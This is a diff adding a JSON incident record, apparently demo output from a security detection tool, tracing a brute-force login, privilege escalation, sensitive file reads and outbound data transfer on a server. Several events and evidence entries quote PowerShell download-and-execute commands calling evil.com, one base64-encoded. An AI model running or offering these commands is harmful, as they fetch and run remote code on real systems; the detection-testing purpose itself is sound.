@@ -1,0 +1,4334 @@
+﻿{
+  "incidents": [
+    {
+      "incident_id": "INC-B74CDDBA",
+      "created_at": "2026-09-23T11:21:46.010010",
+      "updated_at": "2026-09-23T11:21:46.011008",
+      "severity": "CRITICAL",
+      "risk_score": 91,
+      "attack_type": "Coordinated Attack",
+      "status": "OPEN",
+      "start_time": "2026-01-15T12:00:00+00:00",
+      "end_time": "2026-01-15T12:57:00+00:00",
+      "users": [
+        "admin"
+      ],
+      "devices": [
+        "SERVER-01"
+      ],
+      "source_ips": [
+        "185.20.30.42",
+        "185.20.30.18",
+        "10.0.0.100",
+        "10.0.0.199"
+      ],
+      "destination_ips": [
+        "185.20.30.18"
+      ],
+      "events": [
+        {
+          "event_id": "4fcb4dbd4cd1431c94db526fd54ef497",
+          "timestamp": "2026-01-15T12:00:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 1
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "309e9d51b39345b5bfad361ee2e9211a",
+          "timestamp": "2026-01-15T12:01:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 2
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "69f6267b20e14d7faf5c60b38e88b0dc",
+          "timestamp": "2026-01-15T12:02:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 3
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "80096c5fdb8f4e0686bde45e20250ad9",
+          "timestamp": "2026-01-15T12:03:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 4
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "95f0351da7fd423a923a42c6bf6aabd8",
+          "timestamp": "2026-01-15T12:04:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 5
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "eef302367a7045d9b4b37f917a81bd78",
+          "timestamp": "2026-01-15T12:05:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 6
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "332f05701143466ab9bf1c13e83481ce",
+          "timestamp": "2026-01-15T12:06:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 7
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "4ecbf85e9a894515a4a0a3996fd504dc",
+          "timestamp": "2026-01-15T12:07:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 8
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "7a018318b1ca48b2bf696cac1e8b4c79",
+          "timestamp": "2026-01-15T12:08:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 9
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "6cdc0f2e0617416cba945318145c8897",
+          "timestamp": "2026-01-15T12:09:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 10
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "4eba6038b5fc4a8293e5af029bd3267c",
+          "timestamp": "2026-01-15T12:10:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 11
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "499cf096fc0a4781bf14775958a20d52",
+          "timestamp": "2026-01-15T12:11:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 12
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "0c347bd66ea04d06ba628c3e2bf926cc",
+          "timestamp": "2026-01-15T12:12:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 13
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "de6945dac2fb4191ba209735eb311bc6",
+          "timestamp": "2026-01-15T12:13:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 14
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "8a21d5685aa8428592569b36dacc4856",
+          "timestamp": "2026-01-15T12:14:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 15
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "a0fe63cb9fb2479b96151fea98a3a371",
+          "timestamp": "2026-01-15T12:15:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 16
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "50c2bf772c594cedb63db1a5b08f3cf2",
+          "timestamp": "2026-01-15T12:16:00+00:00",
+          "source": "authentication",
+          "event_type": "failed_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_failed",
+          "metadata": {
+            "failure_reason": "invalid_password",
+            "attempt_number": 17
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "d492ce0b4b42460199064969fb3dad01",
+          "timestamp": "2026-01-15T12:17:00+00:00",
+          "source": "authentication",
+          "event_type": "successful_login",
+          "user": "admin",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_success",
+          "metadata": {
+            "session_id": "75d6ea08-16db-4099-9250-c1bfca89d01d"
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "491c1d1f7b9445bca8630cfc010b1389",
+          "timestamp": "2026-01-15T12:20:00+00:00",
+          "source": "authentication",
+          "event_type": "successful_login",
+          "user": "admin",
+          "source_ip": "185.20.30.18",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "login_success",
+          "metadata": {
+            "session_id": "bb8a08c2-45df-4113-bc41-b31a2ebf46eb",
+            "is_new_ip": true
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "e6c796d169254b838237d40413d78388",
+          "timestamp": "2026-01-15T12:25:00+00:00",
+          "source": "authentication",
+          "event_type": "privilege_escalation",
+          "user": "admin",
+          "source_ip": "185.20.30.18",
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "execute",
+          "metadata": {
+            "privilege_change": "admin_to_system",
+            "method": "token_impersonation"
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "277ed35271ab4c2281f67035338937b7",
+          "timestamp": "2026-01-15T12:30:00+00:00",
+          "source": "endpoint",
+          "event_type": "powershell_execution",
+          "user": "admin",
+          "source_ip": null,
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "execute",
+          "metadata": {
+            "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
+            "parent_process": "cmd.exe",
+            "is_suspicious": true
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "ef12273119df42a7aaaf200c344607b4",
+          "timestamp": "2026-01-15T12:33:00+00:00",
+          "source": "endpoint",
+          "event_type": "powershell_execution",
+          "user": "admin",
+          "source_ip": null,
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "execute",
+          "metadata": {
+            "command": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
+            "parent_process": "cmd.exe",
+            "is_suspicious": true
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "82760cc7e0b24e759ca325262d01cfe9",
+          "timestamp": "2026-01-15T12:36:00+00:00",
+          "source": "endpoint",
+          "event_type": "powershell_execution",
+          "user": "admin",
+          "source_ip": null,
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "execute",
+          "metadata": {
+            "command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
+            "parent_process": "cmd.exe",
+            "is_suspicious": true
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "e6faa00bb99b4c8599d4df32c5b362b6",
+          "timestamp": "2026-01-15T12:40:00+00:00",
+          "source": "endpoint",
+          "event_type": "file_access",
+          "user": "admin",
+          "source_ip": null,
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "read",
+          "metadata": {
+            "file_path": "C:\\HR\\salaries.xlsx",
+            "size": 2003351
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "e6042c1eaf204ff78bc926cf853349ca",
+          "timestamp": "2026-01-15T12:45:00+00:00",
+          "source": "endpoint",
+          "event_type": "file_access",
+          "user": "admin",
+          "source_ip": null,
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "read",
+          "metadata": {
+            "file_path": "C:\\Users\\admin\\Documents\\passwords.xlsx",
+            "size": 3221368
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "db1c07dd47624e45ac8ffef5741f0ada",
+          "timestamp": "2026-01-15T12:50:00+00:00",
+          "source": "endpoint",
+          "event_type": "file_access",
+          "user": "admin",
+          "source_ip": null,
+          "destination_ip": null,
+          "device": "SERVER-01",
+          "port": null,
+          "protocol": null,
+          "action": "read",
+          "metadata": {
+            "file_path": "/var/www/html/config.php",
+            "size": 8786324
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "e19341b63e984eccb927e49bc4c16fd5",
+          "timestamp": "2026-01-15T12:55:00+00:00",
+          "source": "network",
+          "event_type": "data_transfer",
+          "user": "admin",
+          "source_ip": "10.0.0.100",
+          "destination_ip": "185.20.30.18",
+          "device": "SERVER-01",
+          "port": 443,
+          "protocol": "TCP",
+          "action": "transfer",
+          "metadata": {
+            "bytes_sent": 812806682,
+            "bytes_received": 2929,
+            "duration_seconds": 254
+          },
+          "raw_event": null,
+          "is_demo": true
+        },
+        {
+          "event_id": "973b2f487b3747afb8ad493be41a0c97",
+          "timestamp": "2026-01-15T12:57:00+00:00",
+          "source": "firewall",
+          "event_type": "allowed_connection",
+          "user": "admin",
+          "source_ip": "10.0.0.199",
+          "destination_ip": "185.20.30.18",
+          "device": "SERVER-01",
+          "port": 443,
+          "protocol": "TCP",
+          "action": "allow",
+          "metadata": {
+            "rule": "allow_outbound_https",
+            "bytes": 5366937
+          },
+          "raw_event": null,
+          "is_demo": true
+        }
+      ],
+      "evidence": [
+        {
+          "type": "rule_match",
+          "rule_type": "brute_force",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "description": "Brute force: 15 failed logins for admin from 185.20.30.42 followed by successful login",
+          "matched_event_count": 16,
+          "entities": {
+            "source_ip": "185.20.30.42",
+            "user": "admin"
+          }
+        },
+        {
+          "type": "rule_match",
+          "rule_type": "suspicious_powershell",
+          "severity": "HIGH",
+          "confidence": 0.85,
+          "description": "Suspicious PowerShell execution by admin on SERVER-01: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
+          "matched_event_count": 19,
+          "entities": {
+            "user": "admin",
+            "device": "SERVER-01"
+          }
+        },
+        {
+          "type": "rule_match",
+          "rule_type": "suspicious_powershell",
+          "severity": "HIGH",
+          "confidence": 0.85,
+          "description": "Suspicious PowerShell execution by admin on SERVER-01: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
+          "matched_event_count": 19,
+          "entities": {
+            "user": "admin",
+            "device": "SERVER-01"
+          }
+        },
+        {
+          "type": "rule_match",
+          "rule_type": "suspicious_powershell",
+          "severity": "HIGH",
+          "confidence": 0.85,
+          "description": "Suspicious PowerShell execution by admin on SERVER-01: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBE",
+          "matched_event_count": 19,
+          "entities": {
+            "user": "admin",
+            "device": "SERVER-01"
+          }
+        },
+        {
+          "type": "rule_match",
+          "rule_type": "data_exfiltration",
+          "severity": "CRITICAL",
+          "confidence": 0.9,
+          "description": "Potential data exfiltration by admin on SERVER-01",
+          "matched_event_count": 4,
+          "entities": {
+            "user": "admin",
+            "device": "SERVER-01"
+          }
+        },
+        {
+          "type": "rule_match",
+          "rule_type": "coordinated_attack",
+          "severity": "CRITICAL",
+          "confidence": 0.95,
+          "description": "Related authentication, endpoint and network attack indicators",
+          "matched_event_count": 8,
+          "entities": {
+            "users": [
+              "admin"
+            ],
+            "devices": [
+              "SERVER-01"
+            ],
+            "source_ips": [
+              "10.0.0.100",
+              "185.20.30.18"
+            ]
+          }
+        },
+        {
+          "type": "attack_chain",
+          "chain_id": "b7dff52b",
+          "attack_type": "coordinated_attack",
+          "correlation_score": 1.0,
+          "event_count": 20,
+          "description": "Entity-correlated chain via user=admin (20 events)",
+          "entities": {
+            "source_ips": [
+              "185.20.30.42",
+              "185.20.30.18"
+            ],
+            "users": [
+              "admin"
+            ],
+            "devices": [
+              "SERVER-01"
+            ]
+          }
+        },
+        {
+          "type": "attack_chain",
+          "chain_id": "98eb4651",
+          "attack_type": "data_exfiltration",
+          "correlation_score": 1.0,
+          "event_count": 6,
+          "description": "Entity-correlated chain via user=admin (6 events)",
+          "entities": {
+            "users": [
+              "admin"
+            ],
+            "devices": [
+              "SERVER-01"
+            ],
+            "source_ips": [
+              "10.0.0.100"
+            ],
+            "destination_ips": [
+              "185.20.30.18"
+            ]
+          }
+        },
+        {
+          "type": "attack_chain",
+          "chain_id": "152ea970",
+          "attack_type": "brute_force_to_compromise",
+          "correlation_score": 1.0,
+          "event_count": 6,
+          "description": "Attack pattern 'brute_force_to_compromise' matched: 6 steps",
+          "entities": {
+            "source_ips": [
+              "185.20.30.42",
+              "185.20.30.18",
+              "10.0.0.100"
+            ],
+            "users": [
+              "admin"
+            ],
+            "devices": [
+              "SERVER-01"
+            ],
+            "destination_ips": [
+              "185.20.30.18"
+            ]
+          }
+        },
+        {
+          "type": "attack_chain",
+          "chain_id": "377428f8",
+          "attack_type": "coordinated_attack",
+          "correlation_score": 0.8,
+          "event_count": 13,
+          "description": "Temporal correlation: 13 events across 2 sources in 30min",
+          "entities": {
+            "source_ips": [
+              "185.20.30.42",
+              "185.20.30.18"
+            ],
+            "users": [
+              "admin"
+            ],
+            "devices": [
+              "SERVER-01"
+            ]
+          }
+        },
+        {
+          "type": "attack_chain",
+          "chain_id": "dc336107",
+          "attack_type": "data_exfiltration",
+          "correlation_score": 0.8,
+          "event_count": 9,
+          "description": "Temporal correlation: 9 events across 2 sources in 30min",
+          "entities": {
+            "source_ips": [
+              "185.20.30.42",
+              "185.20.30.18"
+            ],
+            "users": [
+              "admin"
+            ],
+            "devices": [
+              "SERVER-01"
+            ]
+          }
+        },
+        {
+          "type": "attack_chain",
+          "chain_id": "3e09fb9d",
+          "attack_type": "data_exfiltration",
+          "correlation_score": 0.8,
+          "event_count": 3,
+          "description": "Temporal correlation: 3 events across 2 sources in 30min",
+          "entities": {
+            "users": [
+              "admin"
+            ],
+            "devices": [
+              "SERVER-01"
+            ],
+            "source_ips": [
+              "10.0.0.100"
+            ],
+            "destination_ips": [
+              "185.20.30.18"
+            ]
+          }
+        },
+        {
+          "type": "ml_anomaly",
+          "max_anomaly_score": 0.6899262414450478,
+          "anomalous_event_count": 28,
+          "total_events": 28
+        }
+      ],
+      "anomaly_score": 0.6899262414450478,
+      "attack_chain": [
+        {
+          "chain_id": "b7dff52b",
+          "attack_type": "coordinated_attack",
+          "correlation_score": 1.0,
+          "steps": [
+            {
+              "sequence": 0,
+              "timestamp": "2026-01-15T12:00:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 1,
+              "timestamp": "2026-01-15T12:01:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 2,
+              "timestamp": "2026-01-15T12:02:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 3,
+              "timestamp": "2026-01-15T12:03:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 4,
+              "timestamp": "2026-01-15T12:04:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 5,
+              "timestamp": "2026-01-15T12:05:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 6,
+              "timestamp": "2026-01-15T12:06:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 7,
+              "timestamp": "2026-01-15T12:07:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 8,
+              "timestamp": "2026-01-15T12:08:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 9,
+              "timestamp": "2026-01-15T12:09:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 10,
+              "timestamp": "2026-01-15T12:10:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 11,
+              "timestamp": "2026-01-15T12:11:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 12,
+              "timestamp": "2026-01-15T12:12:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 13,
+              "timestamp": "2026-01-15T12:13:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 14,
+              "timestamp": "2026-01-15T12:14:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 15,
+              "timestamp": "2026-01-15T12:15:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 16,
+              "timestamp": "2026-01-15T12:16:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 17,
+              "timestamp": "2026-01-15T12:17:00+00:00",
+              "event_type": "successful_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 18,
+              "timestamp": "2026-01-15T12:25:00+00:00",
+              "event_type": "privilege_escalation",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.18",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 19,
+              "timestamp": "2026-01-15T12:30:00+00:00",
+              "event_type": "powershell_execution",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            }
+          ]
+        },
+        {
+          "chain_id": "98eb4651",
+          "attack_type": "data_exfiltration",
+          "correlation_score": 1.0,
+          "steps": [
+            {
+              "sequence": 0,
+              "timestamp": "2026-01-15T12:33:00+00:00",
+              "event_type": "powershell_execution",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 1,
+              "timestamp": "2026-01-15T12:36:00+00:00",
+              "event_type": "powershell_execution",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 2,
+              "timestamp": "2026-01-15T12:40:00+00:00",
+              "event_type": "file_access",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 3,
+              "timestamp": "2026-01-15T12:45:00+00:00",
+              "event_type": "file_access",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 4,
+              "timestamp": "2026-01-15T12:50:00+00:00",
+              "event_type": "file_access",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            },
+            {
+              "sequence": 5,
+              "timestamp": "2026-01-15T12:55:00+00:00",
+              "event_type": "data_transfer",
+              "source": "network",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "10.0.0.100",
+              "destination_ip": "185.20.30.18",
+              "correlation_reasons": [
+                "shared_user:admin"
+              ]
+            }
+          ]
+        },
+        {
+          "chain_id": "152ea970",
+          "attack_type": "brute_force_to_compromise",
+          "correlation_score": 1.0,
+          "steps": [
+            {
+              "sequence": 0,
+              "timestamp": "2026-01-15T12:08:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "pattern:brute_force_to_compromise",
+                "step_0:failed_login"
+              ]
+            },
+            {
+              "sequence": 1,
+              "timestamp": "2026-01-15T12:17:00+00:00",
+              "event_type": "successful_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "pattern:brute_force_to_compromise",
+                "step_1:successful_login"
+              ]
+            },
+            {
+              "sequence": 2,
+              "timestamp": "2026-01-15T12:25:00+00:00",
+              "event_type": "privilege_escalation",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.18",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "pattern:brute_force_to_compromise",
+                "step_2:privilege_escalation"
+              ]
+            },
+            {
+              "sequence": 3,
+              "timestamp": "2026-01-15T12:30:00+00:00",
+              "event_type": "powershell_execution",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "pattern:brute_force_to_compromise",
+                "step_3:powershell_execution"
+              ]
+            },
+            {
+              "sequence": 4,
+              "timestamp": "2026-01-15T12:40:00+00:00",
+              "event_type": "file_access",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "pattern:brute_force_to_compromise",
+                "step_4:file_access"
+              ]
+            },
+            {
+              "sequence": 5,
